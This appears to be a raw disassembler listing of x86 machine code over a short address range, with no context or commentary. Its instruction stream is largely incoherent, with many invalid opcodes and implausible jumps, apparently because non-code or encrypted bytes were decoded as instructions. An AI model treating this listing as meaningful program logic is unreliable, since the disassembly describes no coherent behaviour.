  40e63a:	xor    ecx,DWORD PTR [edi]
  40e63c:	xor    ecx,edx
  40e63e:	add    edx,DWORD PTR [ebp+0x3]
  40e641:	mov    ecx,DWORD PTR [edi]
  40e643:	lock retf 0x4dfa
  40e647:	stc    
  40e648:	mov    ecx,DWORD PTR [eax]
  40e64a:	or     BYTE PTR [ebp+0x4d],cl
  40e64d:	jmp    0x104e6dd
  40e652:	dec    ebp
  40e653:	dec    ebp
  40e654:	(bad)  
  40e655:	mov    ebx,esp
  40e657:	clc    
  40e658:	test   ebx,ecx
  40e65a:	clc    
  40e65b:	ror    DWORD PTR [ebp-0x2a],cl
  40e65e:	mov    esi,ecx
  40e660:	call   0x33cc2c14
  40e665:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40e66c:	retf   
  40e66d:	ja     0x40e63d
  40e66f:	mov    ebp,DWORD PTR [eax-0x48]
  40e672:	dec    ebp
  40e673:	xor    ecx,DWORD PTR [di+0x3]
  40e677:	mov    esp,esp
  40e679:	clc    
  40e67a:	push   ebp
  40e67b:	retf   
  40e67c:	mov    dl,bl
  40e67e:	adc    esi,edx
  40e680:	jb     0x40e650
  40e682:	add    BYTE PTR [edi-0x3b7474b3],ch
  40e688:	call   0x4d6cb20a
  40e68d:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  40e693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e694:	popf   
  40e695:	inc    ebp
  40e696:	xor    cl,BYTE PTR [ebp-0x78]
  40e699:	mov    edx,edi
  40e69b:	clc    
  40e69c:	dec    ebp
  40e69d:	retf   
  40e69e:	mov    edx,ebx
  40e6a0:	call   0x560fba7b
  40e6a5:	scas   eax,DWORD PTR es:[edi]
  40e6a6:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  40e6ac:	popf   
  40e6ad:	sub    esi,DWORD PTR [edx]
  40e6af:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e6b5:	lods   al,BYTE PTR ds:[esi]
  40e6b6:	xor    esp,DWORD PTR [ebx]
  40e6b8:	add    ecx,DWORD PTR [ebp-0x1c]
  40e6bb:	mov    edi,DWORD PTR [ebp-0x8]
  40e6be:	mov    bl,cl
  40e6c0:	cmp    dl,bl
  40e6c2:	jb     0x40e692
  40e6c4:	add    dh,dl
  40e6c6:	dec    ebp
  40e6c7:	scas   eax,DWORD PTR es:[edi]
  40e6c8:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  40e6ce:	shr    DWORD PTR [ebx],cl
  40e6d0:	into   
  40e6d1:	cmp    edx,esi
  40e6d3:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  40e6d9:	dec    ebp
  40e6da:	dec    ebp
  40e6db:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  40e6e1:	retf   
  40e6e2:	xor    edx,esi
  40e6e4:	add    ecx,esi
  40e6e6:	imul   ecx,edx
  40e6e9:	mov    DWORD PTR [ebp+0x8],edx
  40e6ec:	xor    ecx,DWORD PTR [ebp+0x2b]
  40e6ef:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  40e6f5:	add    esi,DWORD PTR [ebx]
  40e6f7:	mov    ah,0x3
  40e6f9:	inc    ebp
  40e6fa:	sysexit 
  40e6fc:	xlat   BYTE PTR ds:[ebx]
  40e6fd:	pushf  
  40e6fe:	jge    0x40e689
  40e700:	xor    ebx,eax
  40e702:	sub    eax,DWORD PTR [ebp-0x73]
  40e705:	(bad)  
  40e706:	cmp    al,al
  40e708:	jb     0x40e68f
  40e70a:	add    al,bh
  40e70c:	ror    DWORD PTR [ebp-0x7a],1
  40e70f:	xor    edi,edi
  40e711:	add    edi,edi
  40e713:	jmp    0x40e762
  40e715:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40e71b:	dec    ebp
  40e71c:	into   
  40e71d:	mov    ebp,DWORD PTR [edi-0x23737428]
  40e723:	popf   
  40e724:	shl    DWORD PTR [edx],cl
  40e726:	retf   0x5588
  40e729:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40e72f:	add    eax,DWORD PTR [eax]
  40e731:	in     al,0x4d
  40e733:	push   ebp
  40e734:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  40e73a:	arpl   WORD PTR [eax],ax
  40e73c:	int    0x4d
  40e73e:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  40e744:	dec    ebp
  40e745:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  40e74b:	jge    0x40e71b
  40e74d:	mov    BYTE PTR [edi+0xf723b3a],ch
  40e753:	add    cl,dh
  40e755:	dec    ebp
  40e756:	dec    DWORD PTR [ebx-0x2c032375]
  40e75c:	adc    BYTE PTR [ebp+0x1],0x8b
  40e760:	add    al,bl
  40e762:	jge    0x40e6f0
  40e764:	push   0xffffff9d
  40e766:	push   0x8b3032
  40e76b:	shl    BYTE PTR [ebp+0x55],0x6a
  40e76f:	xor    edi,edi
  40e771:	xor    edx,DWORD PTR [ebx+eax*1]
  40e774:	inc    ebp
  40e775:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  40e77b:	dec    ebp
  40e77c:	or     BYTE PTR [ecx+0x4dc8e483],cl
  40e782:	jbe    0x40e70f
  40e784:	mov    ebp,esp
  40e786:	ror    bl,1
  40e788:	enter  0x14ce,0xaf
  40e78c:	dec    DWORD PTR [ebx-0x2cef17f8]
  40e792:	push   ebp
  40e793:	retf   0x5540
  40e796:	push   ebp
  40e797:	mov    esi,DWORD PTR [edx-0x1c]
  40e79a:	mov    edx,ebx
  40e79c:	cld    
  40e79d:	(bad)  
  40e79e:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  40e7a5:	sti    
  40e7a6:	add    dh,cl
  40e7a8:	push   0xffffff94
  40e7aa:	call   FWORD PTR [ebp+0x3b5032d0]
  40e7b0:	mov    ecx,DWORD PTR [edi]
  40e7b2:	int3   
  40e7b3:	pop    esi
  40e7b4:	inc    ebp
  40e7b5:	dec    DWORD PTR [ecx+0x45e8c88b]
  40e7bb:	push   ebp
  40e7bc:	xor    esi,DWORD PTR [ebx]
  40e7be:	mov    DWORD PTR [ebx],0xcace0f9c
  40e7c4:	aas    
  40e7c5:	push   ebp
  40e7c6:	inc    ebp
  40e7c7:	xor    eax,esi
  40e7c9:	add    eax,esi
  40e7cb:	mov    eax,DWORD PTR [ebx]
  40e7cd:	(bad)  
  40e7ce:	jmp    0x40e75c
  40e7d0:	mov    bl,BYTE PTR [ebp-0x7674cdfb]
  40e7d6:	rol    ah,1
  40e7d8:	mov    esi,0xf133104d
  40e7dd:	mov    edx,0xff368d80
  40e7e2:	mov    dh,0xd1
  40e7e4:	cmp    edx,DWORD PTR [ebp+0xf]
  40e7e7:	mov    eax,DWORD PTR [edx-0x20]
  40e7ea:	add    BYTE PTR [ebp-0x75],bh
  40e7ed:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  40e7f4:	popf   
  40e7f5:	retf   0x8632
  40e7f8:	cmp    ebp,0x8
  40e7fb:	call   ebx
  40e7fd:	inc    ebp
  40e7fe:	inc    ebp
  40e7ff:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  40e805:	mov    esi,DWORD PTR ds:0xc7049cc8
  40e80b:	add    al,al
  40e80d:	add    bl,al
  40e80f:	(bad)  
  40e810:	clc    
  40e811:	enter  0x45,0x35
  40e815:	push   eax
  40e816:	pushf  
  40e817:	mov    edi,eax
  40e819:	int3   
  40e81a:	or     al,al
  40e81c:	test   DWORD PTR [edi],edi
  40e81e:	clc    
  40e81f:	gs inc ebp
  40e821:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  40e827:	push   ss
  40e828:	xor    ecx,DWORD PTR [ebp+0x3]
  40e82b:	sub    edx,DWORD PTR [ecx-0x76]
  40e82e:	dec    ebp
  40e82f:	add    DWORD PTR [ebx+0x88d845],ecx
  40e835:	mov    esi,DWORD PTR [ebx]
  40e837:	or     BYTE PTR [ebx],al
  40e839:	cmp    edx,DWORD PTR [ecx-0x38]
  40e83c:	dec    ebp
  40e83d:	out    dx,eax
  40e83e:	xor    eax,DWORD PTR [ebp+0x3]
  40e841:	mov    edx,DWORD PTR [ecx-0x28]
  40e844:	dec    ebp
  40e845:	add    BYTE PTR [ebx],dh
  40e847:	push   0x518003
  40e84c:	push   eax
  40e84d:	add    BYTE PTR [ebx-0x300748b],cl
  40e853:	sbb    BYTE PTR [ebp+0x45],cl
  40e856:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40e85c:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  40e862:	dec    ebp
  40e863:	inc    ebp
  40e864:	xor    eax,esi
  40e866:	add    eax,esi
  40e868:	push   ecx
  40e869:	(bad)  
  40e86a:	dec    ebp
  40e86b:	mov    al,ds:0xc9e031ff
  40e870:	retf   
  40e871:	(bad)  
  40e872:	into   
  40e873:	sub    bh,bh
  40e875:	dec    esp
  40e876:	adc    al,0x9c
  40e878:	inc    ebp
  40e879:	push   ebp
  40e87a:	test   DWORD PTR [edi],ecx
  40e87c:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab7ff80]
  40e883:	jmp    0xc9b9f797
  40e888:	add    cl,dl
  40e88a:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  40e894:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  40e89a:	rol    BYTE PTR [eax],0x56
  40e89d:	clc    
  40e89e:	arpl   WORD PTR [edx+0x7],si
  40e8a1:	mov    eax,DWORD PTR [ebp-0x30]
  40e8a4:	xor    al,0x40
  40e8a6:	sub    al,0xc7
  40e8a8:	mov    ah,ch
  40e8aa:	add    DWORD PTR [ebp+0x4534f845],eax
  40e8b0:	sub    al,0x84
  40e8b2:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  40e8b9:	mov    ch,0xff
  40e8bb:	clc    
  40e8bc:	add    DWORD PTR [ebp+0x60],0x31
  40e8c0:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  40e8c7:	inc    ebp
  40e8c8:	dec    DWORD PTR [ebx-0x341ff701]
  40e8ce:	test   esi,ecx
  40e8d0:	dec    DWORD PTR [ebx-0x7f8a3301]
  40e8d6:	push   eax
  40e8d7:	add    DWORD PTR [ebp+0x0],eax
  40e8da:	dec    ebx
  40e8dc:	or     al,0xce
  40e8de:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  40e8e5:	into   
  40e8e6:	add    BYTE PTR [ebx-0x34ff1400],cl
  40e8ec:	mov    esi,ecx
  40e8ee:	sar    bh,0x45
  40e8f1:	adc    al,0x8b
  40e8f3:	clc    
  40e8f4:	fadd   DWORD PTR [ebp+0x0]
  40e8f7:	mov    ebp,DWORD PTR [edx+0x8]
  40e8fa:	push   edi
  40e8fb:	adc    BYTE PTR [eax+0x1],0x83
  40e8ff:	add    al,al
  40e901:	retf   
  40e902:	mov    ecx,esi
  40e904:	cld    
  40e905:	mov    eax,DWORD PTR [eax+0xcb01cc]
  40e90b:	into   
  40e90c:	add    BYTE PTR [ebx+0x756aec00],cl
  40e912:	jne    0x40e947
  40e914:	inc    DWORD PTR [ebx]
  40e916:	rcl    BYTE PTR [ecx+0x50],1
  40e919:	push   eax
  40e91a:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  40e920:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  40e927:	sar    bh,0x84
  40e92a:	or     BYTE PTR [ebx],al
  40e92c:	push   eax
  40e92d:	add    BYTE PTR [ebx+0x4530c845],cl
  40e933:	pushf  
  40e934:	xor    eax,0x89b49cc7
  40e939:	test   eax,ebp
  40e93b:	clc    
  40e93c:	inc    ebp
  40e93d:	inc    ebp
  40e93e:	mov    DWORD PTR [eax+eax*8],esi
  40e941:	sub    al,0x32
  40e943:	mov    BYTE PTR [ebx+ecx*4+0x56d8ec89],bl
  40e94a:	dec    ebp
  40e94b:	arpl   WORD PTR [ebx],si
  40e94d:	inc    edi
  40e94e:	add    ecx,DWORD PTR [ebx+0x56f4b489]
  40e954:	dec    ebp
  40e955:	arpl   WORD PTR [ebx],si
  40e957:	inc    edi
  40e958:	add    eax,DWORD PTR [ebx-0xf7a377]
  40e95e:	inc    ebp
  40e95f:	add    ch,dl
  40e961:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e962:	pushf  
  40e963:	inc    edi
  40e965:	dec    esp
  40e967:	lea    eax,[ebp+0x45fff860]
  40e96d:	push   eax
  40e96e:	xor    BYTE PTR [ebp-0x64],dh
  40e971:	(bad)  
  40e972:	(bad)  
  40e973:	pop    esp
  40e974:	lods   al,BYTE PTR ds:[esi]
  40e975:	inc    DWORD PTR [ebp+0x4508f8ff]
  40e97b:	mov    edi,DWORD PTR [esi]
  40e97d:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  40e984:	test   DWORD PTR [edi-0x8],edx
  40e987:	inc    esi
  40e988:	inc    ebp
  40e989:	add    BYTE PTR [eax+ebp*2],bh
  40e98c:	pushf  
  40e98d:	or     BYTE PTR [ebx+0x5545ec00],0x8b
  40e994:	xor    edi,esp
  40e996:	add    eax,DWORD PTR [eax+0xf013b]
  40e99c:	adc    al,0x0
  40e99e:	add    bh,bh
  40e9a0:	jmp    0xbdeabd
  40e9a5:	add    BYTE PTR [ebp+0x45],cl
  40e9a8:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  40e9ae:	dec    ebp
  40e9af:	push   0x38033
  40e9b4:	cmp    eax,DWORD PTR [eax]
  40e9b6:	unpcklps xmm7,xmm0
  40e9b9:	jne    0x40e9bb
  40e9bb:	dec    DWORD PTR [ebx+0x5545cc18]
  40e9c1:	mov    DWORD PTR [ebx],esi
  40e9c3:	shl    BYTE PTR [ebx],1
  40e9c5:	inc    ebp
  40e9c6:	add    ecx,DWORD PTR [ecx+0x60fc803]
  40e9cc:	retf   0x5575
  40e9cf:	dec    DWORD PTR [ebx-0x5ba17e8]
  40e9d5:	(bad)  
  40e9d6:	stc    
  40e9d7:	in     al,dx
  40e9d8:	or     al,0x85
  40e9da:	dec    ebp
  40e9db:	clc    
  40e9dc:	xor    eax,DWORD PTR [ebp+0x3]
  40e9df:	mov    ebp,ecx
  40e9e1:	rol    BYTE PTR [eax],1
  40e9e3:	inc    ebp
  40e9e4:	add    BYTE PTR [eax-0x7747ab3],bh
  40e9ea:	clc    
  40e9eb:	inc    ebp
  40e9ec:	retf   
  40e9ed:	mov    edx,ebx
  40e9ef:	in     al,dx
  40e9f0:	(bad)  
  40e9f1:	retf   
  40e9f2:	into   
  40e9f3:	into   
  40e9f4:	scas   eax,DWORD PTR es:[edi]
  40e9f5:	dec    ebp
  40e9f6:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  40e9fc:	sub    ecx,esi
  40e9fe:	cmp    ecx,DWORD PTR [ebp+0x77]
  40ea01:	(bad)  
  40ea02:	mov    edi,eax
  40ea04:	int3   
  40ea05:	test   DWORD PTR [ecx-0x74baff08],ecx
  40ea0b:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  40ea12:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40ea18:	rdtsc  
  40ea1a:	retf   0x559c
  40ea1d:	(bad)  
  40ea1e:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  40ea25:	inc    ebp
  40ea26:	add    eax,0xeb9c4d3f
  40ea2b:	(bad)  
  40ea2c:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  40ea32:	xor    ecx,DWORD PTR [ebp+0x33]
  40ea35:	mov    eax,DWORD PTR [ebx]
  40ea37:	call   0xce50b53f
  40ea3c:	retf   0x55d1
  40ea3f:	test   BYTE PTR [ebx-0x5ff17fe],cl
  40ea45:	jmp    0x40ea40
  40ea47:	add    BYTE PTR ds:0xebf44d8b,al
  40ea4d:	push   ebp
  40ea4e:	mov    ebp,DWORD PTR [ebx]
  40ea50:	mov    eax,0x33f8558b
  40ea55:	retf   
  40ea56:	xor    ecx,esi
  40ea58:	add    edx,ecx
  40ea5a:	add    eax,DWORD PTR [edx+0xca010f]
  40ea60:	push   ebp
  40ea61:	dec    ebp
  40ea62:	mov    ecx,DWORD PTR [ebx-0x34050718]
  40ea68:	stc    
  40ea69:	rol    DWORD PTR ds:0xebce4dd6,cl
  40ea6f:	scas   eax,DWORD PTR es:[edi]
  40ea70:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  40ea76:	xor    ebp,DWORD PTR [ebx]
  40ea78:	xor    edi,DWORD PTR [ebx]
  40ea7a:	add    esi,DWORD PTR [edi+0x3]
  40ea7d:	mov    ecx,DWORD PTR [edi]
  40ea7f:	clc    
  40ea80:	retf   0x55cb
  40ea83:	into   
  40ea84:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  40ea8b:	test   al,0x4d
  40ea8d:	push   ebp
  40ea8e:	jbe    0x40eac3
  40ea90:	mov    esi,DWORD PTR [ebx]
  40ea92:	mov    al,0x3
  40ea94:	push   ebp
  40ea95:	add    esi,DWORD PTR [ebx]
  40ea97:	rdpmc  
  40ea99:	retf   0x5503
  40ea9c:	add    ecx,DWORD PTR [ebx-0x53517f1]
  40eaa2:	dec    ebp
  40eaa3:	stc    
  40eaa4:	mov    ecx,DWORD PTR [eax]
  40eaa6:	or     BYTE PTR [ebp+0x4d],cl
  40eaa9:	jmp    0x134eb39
  40eaae:	dec    ebp
  40eaaf:	dec    ebp
  40eab0:	(bad)  
  40eab1:	mov    ebx,esp
  40eab3:	clc    
  40eab4:	test   ebx,ecx
  40eab6:	clc    
  40eab7:	ror    DWORD PTR [ebp-0x2a],cl
  40eaba:	mov    esi,ecx
  40eabc:	lock scas eax,DWORD PTR es:[edi]
  40eabe:	inc    ebp
  40eabf:	mov    esi,DWORD PTR [ebx]
  40eac1:	hlt    
  40eac2:	pushf  
  40eac3:	jge    0x40ea50
  40eac5:	sub    ebx,esp
  40eac7:	cmp    ecx,ebx
  40eac9:	ja     0x40ea99
  40eacb:	mov    ebp,DWORD PTR [eax-0x58]
  40eace:	dec    ebp
  40eacf:	xor    ecx,DWORD PTR [di+0x3]
  40ead3:	mov    esp,esp
  40ead5:	clc    
  40ead6:	push   ebp
  40ead7:	retf   
  40ead8:	mov    dl,bl
  40eada:	adc    esi,edx
  40eadc:	jb     0x40eaac
  40eade:	add    BYTE PTR [edi-0xb7474b3],ch
  40eae4:	lock jge 0x40eab2
  40eae7:	sub    ecx,DWORD PTR [ebp+0x3b]
  40eaea:	mov    esi,DWORD PTR [edi-0x20]
  40eaed:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459d]
  40eaf4:	mov    BYTE PTR [ebx-0x34b20729],cl
  40eafa:	mov    edx,ebx
  40eafc:	lock (bad) 
  40eafe:	ror    esi,cl
  40eb00:	push   ebp
  40eb01:	scas   eax,DWORD PTR es:[edi]
  40eb02:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  40eb08:	popf   
  40eb09:	sub    esi,DWORD PTR [edx]
  40eb0b:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40eb11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb12:	xor    esp,DWORD PTR [ebx]
  40eb14:	add    ecx,DWORD PTR [ebp-0x1c]
  40eb17:	mov    edi,DWORD PTR [ebp-0x8]
  40eb1a:	mov    bl,cl
  40eb1c:	cmp    dl,bl
  40eb1e:	jb     0x40eaee
  40eb20:	add    dh,dl
  40eb22:	dec    ebp
  40eb23:	scas   eax,DWORD PTR es:[edi]
  40eb24:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  40eb2a:	shr    DWORD PTR [ebx],cl
  40eb2c:	into   
  40eb2d:	cmp    edx,esi
  40eb2f:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  40eb35:	dec    ebp
  40eb36:	dec    ebp
  40eb37:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  40eb3d:	retf   
  40eb3e:	xor    edx,esi
  40eb40:	add    ecx,esi
  40eb42:	imul   ecx,edx
  40eb45:	mov    DWORD PTR [ebp+0x8],edx
  40eb48:	xor    ecx,DWORD PTR [ebp+0x2b]
  40eb4b:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  40eb51:	add    esi,DWORD PTR [ebx]
  40eb53:	rol    BYTE PTR [ebx],0x45
  40eb56:	sysexit 
  40eb58:	xlat   BYTE PTR ds:[ebx]
  40eb59:	pushf  
  40eb5a:	jge    0x40eae5
  40eb5c:	xor    esp,eax
  40eb5e:	sub    eax,DWORD PTR [ebp-0x73]
  40eb61:	(bad)  
  40eb62:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  40eb69:	dec    ebp
  40eb6a:	xchg   BYTE PTR [ebx],dh
  40eb6c:	inc    DWORD PTR [ebx]
  40eb6e:	(bad)  
  40eb6f:	jmp    0x40ebbe
  40eb71:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40eb77:	dec    ebp
  40eb78:	into   
  40eb79:	mov    ebp,DWORD PTR [edi-0x23737420]
  40eb7f:	popf   
  40eb80:	shl    DWORD PTR [edx],cl
  40eb82:	retf   0x5588
  40eb85:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40eb8b:	add    eax,DWORD PTR [eax]
  40eb8d:	in     al,0x4d
  40eb8f:	push   ebp
  40eb90:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  40eb96:	arpl   WORD PTR [eax],ax
  40eb98:	int    0x4d
  40eb9a:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  40eba0:	dec    ebp
  40eba1:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  40eba7:	jge    0x40eb77
  40eba9:	mov    BYTE PTR [edi+0xf723b3a],ch
  40ebaf:	add    cl,dh
  40ebb1:	dec    ebp
  40ebb2:	dec    DWORD PTR [ebx-0x2c032301]
  40ebb8:	inc    ebp
  40ebb9:	push   ebp
  40ebba:	dec    DWORD PTR [ebx-0x73ff1f34]
  40ebc0:	lea    ebx,[ebp-0x7400cdac]
  40ebc6:	push   eax
  40ebc7:	mov    ah,0x45
  40ebc9:	push   ebp
  40ebca:	mov    esi,DWORD PTR [ebx]
  40ebcc:	les    esi,FWORD PTR [ebx]
  40ebce:	add    BYTE PTR [ebx],al
  40ebd0:	inc    DWORD PTR [ebx]
  40ebd2:	mov    ecx,DWORD PTR [edi]
  40ebd4:	cld    
  40ebd5:	retf   0x4d80
  40ebd8:	add    DWORD PTR [ecx+0x4d30e400],ecx
  40ebde:	jne    0x40eb6b
  40ebe0:	(bad)  
  40ebe1:	in     al,dx
  40ebe2:	ror    bl,1
  40ebe4:	clc    
  40ebe5:	into   
  40ebe6:	add    BYTE PTR [edi-0xf2f7475],ch
  40ebec:	not    bl
  40ebee:	adc    al,0xca
  40ebf0:	inc    ebp
  40ebf1:	push   ebp
  40ebf2:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  40ebf8:	push   0xaf80d6
  40ebfd:	mov    eax,DWORD PTR [eax]
  40ebff:	fdiv   st(7),st
  40ec01:	sti    
  40ec02:	sbb    dh,cl
  40ec04:	pop    esi
  40ec05:	xchg   esp,eax
  40ec06:	leave  
  40ec07:	popf   
  40ec08:	add    al,0x32
  40ec0a:	push   ebp
  40ec0b:	cmp    ebp,esp
  40ec0d:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  40ec11:	dec    DWORD PTR [ecx-0x740f0375]
  40ec17:	push   ebp
  40ec18:	cld    
  40ec19:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  40ec1f:	retf   0x558b
  40ec22:	clc    
  40ec23:	xor    esi,eax
  40ec25:	add    esi,DWORD PTR [ebp-0x75]
  40ec28:	(bad)  
  40ec29:	hlt    
  40ec2a:	or     cl,BYTE PTR [esi+eax*8-0x39cdf763]
  40ec31:	mov    DWORD PTR [edx],ecx
  40ec33:	hlt    
  40ec34:	(bad)  
  40ec35:	dec    ebp
  40ec36:	add    dh,BYTE PTR [ebx]
  40ec38:	leave  
  40ec39:	mov    edx,0xffec8d55
  40ec3e:	push   ecx
  40ec3f:	rol    DWORD PTR [ebp+0x55],1
  40ec42:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  40ec48:	mov    eax,0xf8030b33
  40ec4d:	lar    ecx,di
  40ec50:	push   ebp
  40ec51:	retf   0x863b
  40ec54:	jne    0x40ec53
  40ec56:	mov    edi,edi
  40ec58:	or     BYTE PTR [ebp+0x41],dh
  40ec5b:	mov    esp,edx
  40ec5d:	cld    
  40ec5e:	inc    eax
  40ec5f:	mov    al,0x29
  40ec61:	add    DWORD PTR [ecx+0x0],eax
  40ec64:	loope  0x40ebeb
  40ec66:	inc    ecx
  40ec67:	call   edx
  40ec69:	inc    edx
  40ec6b:	mov    eax,DWORD PTR [eax]
  40ec6d:	cld    
  40ec6e:	mov    eax,DWORD PTR [eax+0x8d0151]
  40ec74:	clc    
  40ec75:	xor    BYTE PTR [ebp+0x45],al
  40ec78:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  40ec7e:	loopne 0x40ec7f
  40ec80:	mov    edi,edi
  40ec82:	mov    ecx,eax
  40ec84:	clc    
  40ec85:	jne    0x40ec57
  40ec87:	call   0x81fd90
  40ec8c:	sub    DWORD PTR [ebp+0x45],esi
  40ec8f:	test   esi,eax
  40ec91:	je     0x40ec94
  40ec93:	mov    eax,esi
  40ec95:	cld    
  40ec96:	or     DWORD PTR [eax+0x401c9],eax
  40ec9c:	push   ebp
  40ec9d:	add    ah,ch
  40ec9f:	add    BYTE PTR [ecx+0x6a],dl
  40eca2:	inc    ebp
  40eca3:	push   esi
  40eca4:	mov    DWORD PTR [eax-0x4],edx
  40eca7:	pop    edi
  40eca8:	mov    ebx,DWORD PTR [ebx-0x4]
  40ecab:	ret    0xbc
  40ecae:	push   es
  40ecaf:	mov    ecx,DWORD PTR [ecx-0x77274af]
  40ecb5:	clc    
  40ecb6:	lock inc ebp
  40ecb8:	jne    0x40ed10
  40ecba:	(bad)  
  40ecbb:	jne    0x40ecc1
  40ecbd:	mov    eax,0xf841ba66
  40ecc2:	rol    BYTE PTR [esi],cl
  40ecc4:	(bad)  
  40ecc5:	jne    0x40ecf8
  40ecc7:	cmp    eax,ebx
  40ecc9:	pop    esi
  40ecca:	mov    ecx,DWORD PTR [eax]
  40eccc:	push   ecx
  40eccd:	inc    ecx
  40ecce:	lea    edi,[esi-0x8]
  40ecd1:	inc    edx
  40ecd2:	inc    ebp
  40ecd3:	ror    DWORD PTR [ebx-0x408103be],0x41
  40ecda:	xchg   esp,ebp
  40ecdc:	mov    ebx,eax
  40ecde:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  40ece4:	or     edi,eax
  40ece6:	inc    ebp
  40ece7:	inc    ebp
  40ece8:	(bad)  
  40ece9:	mov    ecx,DWORD PTR [eax]
  40eceb:	cld    
  40ecec:	(bad)  
  40eced:	jmp    0x40ecf0
  40ecef:	mov    eax,esi
  40ecf1:	mov    DWORD PTR ds:0x4f8c98b,eax
  40ecf7:	rcl    BYTE PTR [esi+0xf],1
  40ecfa:	iret   
  40ecfb:	inc    ebp
  40ecfc:	leave  
  40ecfd:	(bad)  
  40ecfe:	dec    DWORD PTR [ecx]
  40ed00:	mov    eax,esi
  40ed02:	mov    eax,DWORD PTR [edi]
  40ed04:	mov    dh,0xd1
  40ed07:	push   es
  40ed08:	nop
  40ed09:	(bad)  
  40ed0a:	inc    DWORD PTR [ebx]
  40ed0c:	push   esi
  40ed0d:	leave  
  40ed0e:	iret   
  40ed0f:	add    al,0x46
  40ed11:	push   ebp
  40ed12:	in     eax,0xec
  40ed14:	push   ebp
  40ed15:	push   ecx
  40ed16:	inc    DWORD PTR [ebp+0x56]
  40ed19:	mov    DWORD PTR [esi-0x4],eax
  40ed1c:	loope  0x40ed73
  40ed1e:	sbb    BYTE PTR [eax+0x7c6daff],bh
  40ed24:	add    al,BYTE PTR [edx]
  40ed26:	mov    edx,DWORD PTR [ebp-0x17]
  40ed29:	cmp    edi,esi
  40ed2b:	jne    0x40ed2c
  40ed2d:	(bad)  
  40ed2e:	push   esi
  40ed2f:	pop    es
  40ed30:	push   ebp
  40ed31:	mov    ebp,esp
  40ed33:	or     BYTE PTR [ebp+0x41],al
  40ed36:	add    edi,edx
  40ed38:	sub    BYTE PTR [eax-0x4],al
  40ed3b:	ret    0xc275
  40ed3e:	add    DWORD PTR [eax],eax
  40ed40:	sbb    al,0x8b
  40ed42:	mov    edx,DWORD PTR [ecx+0x14]
  40ed45:	lea    edx,[edx-0x1ba7508]
  40ed4b:	push   esi
  40ed4c:	enter  0xd375,0xb8
  40ed50:	test   DWORD PTR [esi],0x6ce0750
  40ed56:	enter  0xd375,0x3b
  40ed5a:	neg    DWORD PTR [esi+0x50]
  40ed5d:	or     cl,dl
  40ed5f:	inc    edx
  40ed60:	(bad)  
  40ed61:	in     eax,dx
  40ed62:	in     al,dx
  40ed63:	(bad)  
  40ed64:	sub    eax,DWORD PTR [ebx]
  40ed66:	inc    eax
  40ed67:	in     eax,dx
  40ed68:	push   eax
  40ed69:	add    dl,BYTE PTR [eax-0x37]
  40ed6c:	push   edi
  40ed6d:	push   ebp
  40ed6e:	imul   ah
  40ed70:	adc    DWORD PTR [ecx-0x1],0x45
  40ed74:	add    BYTE PTR [ecx+0x55d3fc00],cl
  40ed7a:	lea    edi,[eax-0x7fff4ca]
  40ed80:	mov    eax,0x4550402
  40ed85:	cmp    ebp,ecx
  40ed87:	jne    0x40ed34
  40ed89:	mov    eax,DWORD PTR ds:0x241e808
  40ed8f:	loope  0x40ed91
  40ed91:	inc    eax
  40ed92:	stc    
  40ed93:	xlat   BYTE PTR ds:[ebx]
  40ed94:	ss inc ecx
